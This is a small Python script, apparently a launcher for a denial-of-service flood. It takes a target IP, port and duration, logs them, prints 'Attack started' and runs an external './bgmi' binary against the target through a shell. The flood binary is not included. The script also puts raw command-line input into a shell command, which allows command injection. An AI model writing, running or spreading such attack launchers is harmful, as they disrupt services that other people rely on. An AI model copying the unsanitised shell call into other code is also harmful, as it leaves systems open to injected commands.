import subprocess
import sys
import datetime

LOG_FILE = "log.txt"

def log_command(target, port, time):
    with open(LOG_FILE, "a") as f:
        f.write(f"{datetime.datetime.now()} | Target: {target} | Port: {port} | Time: {time}\n")

def main():
    if len(sys.argv) != 4:
        print("Usage: python m.py <ip> <port> <time>")
        return

    target = sys.argv[1]
    port = int(sys.argv[2])
    time = int(sys.argv[3])

    if time > 300:
        print("❌ Time must be under 300 seconds")
        return

    print("🔥 Attack started...")
    log_command(target, port, time)

    command = f"./bgmi {target} {port} {time} 300"
    subprocess.run(command, shell=True)

    print("✅ Attack finished")

if __name__ == "__main__":
    main()